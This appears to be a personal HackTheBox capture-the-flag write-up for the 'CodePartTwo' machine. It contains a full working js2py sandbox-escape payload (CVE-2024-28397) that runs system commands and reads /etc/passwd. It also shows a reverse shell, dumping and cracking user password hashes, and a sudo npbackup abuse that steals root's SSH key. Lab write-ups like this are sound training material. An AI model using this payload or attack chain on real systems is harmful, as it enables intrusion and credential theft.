
# #HTB 


![[Pasted image 20260202105830.png]]

# HTB: CodePartTwo

**Machine IP:** `10.129.232.59`  
**Difficulty:** Medium  
**OS:** Linux

---

## Step 1: Reconnaissance - Port Scanning

### RustScan Results:

![[Pasted image 20260202105905.png]]

### Nmap Result:
![[Pasted image 20260202105922.png]]


### Nmap Detailed Scan:

|Port|Service|Version|
|---|---|---|
|22/tcp|SSH|OpenSSH 8.2p1 Ubuntu|
|8000/tcp|HTTP|Gunicorn 20.0.4|

## Step 2: Web Application Enumeration

**Website:** `http://10.129.232.59:8000`
The site "CodePartTwo" is a platform where users can:
- Register / Login
- Write, save, and run JavaScript code

![[Pasted image 20260202105944.png]]


![[Pasted image 20260202110026.png]]


![[Pasted image 20260202110109.png]]





## Step 3: Source Code Analysis

The application provides a downloadable `app.zip` file containing the source code

![[Pasted image 20260202110545.png]]
**Key finding:** The application uses `js2py` version **0.74** to execute JavaScript code.




## Step 4: Vulnerability Discovery

#### CVE-2024-28397 - js2py Sandbox Escape

![[Pasted image 20260202110929.png]]
> **CVE-2024-28397:** An issue in the component `js2py.disable_pyimport()` of js2py up to v0.74 allows attackers to execute arbitrary code via a crafted API call.

This vulnerability allows escaping the JavaScript sandbox and executing Python code, which can lead to Remote Code Execution (RCE).




## Step 5: Exploitation - RCE via Sandbox Escape

#### Payload to Execute System Commands:

```
let cmd = "head -n 1 /etc/passwd; calc; gnome-calculator; kcalc; "
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
```





## Step 6: Establishing Reverse Shell

#### Create reverse shell script and Start HTTP server::

![[Pasted image 20260202111645.png]]

#### Start Netcat listener:
![[Pasted image 20260202111700.png]]


#### Modify payload for reverse shell:

![[Pasted image 20260202111617.png]]


#### Execute payload in the application → Reverse shell received!

![[Pasted image 20260202112131.png]]

## Step 7: Database Credentials Extraction

```
app@codeparttwo:~/app/instance$ ls
users.db

app@codeparttwo:~/app/instance$ sqlite3 users.db
.tables
code_snippet  user

select * from user:
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
3|haha|4e4d6c332b6fe62a63afe56171fd3725
```





## Step 8: Cracking Password Hash

Hash: `649c9d65a206a75f5abe509fe128bce5` (MD5)

**Cracked using CrackStation:**

```
sweetangelbabyLove
```

![[Pasted image 20260202112249.png]]





## Step 9: SSH Access as Marco

![[Pasted image 20260202112354.png]]





## Step 10: Privilege Escalation

### Check sudo permissions:

![[Pasted image 20260202113659.png]]

The configuration contains a `repo_password` field with an encrypted value and a note about dumping backups.

### Examine npbackup configuration:

![[Pasted image 20260202114409.png]]



### Use npbackup-cli to dump root's SSH key:

```
marco@codeparttwo:~$ sudo npbackup-cli -c /dev/shm/0xdf.conf --dump /root
```

![[Pasted image 20260202225015.png]]

![[Pasted image 20260202225049.png]]

### Verify key fingerprint:

```
marco@codeparttwo:~$ ssh-keygen -l -f ~/keys/codetwo-root
3072 SHA256:zyDK+0TJQot7rVM+FbpsJHeDVsXdQj4fA14jWkLCDDQ root@codetwo (RSA)
```

![[Pasted image 20260202225110.png]]


### SSH as root:

```
marco@codeparttwo:~$ ssh -i ~/keys/codetwo-root root@localhost
```

![[Pasted image 20260202224847.png]]



## Step 12: Root Flag

```
root@codeparttwo:~# cat /root/root.txt
853af0f73ebd586731045898b28f954
```





![[Pasted image 20260202224942.png]]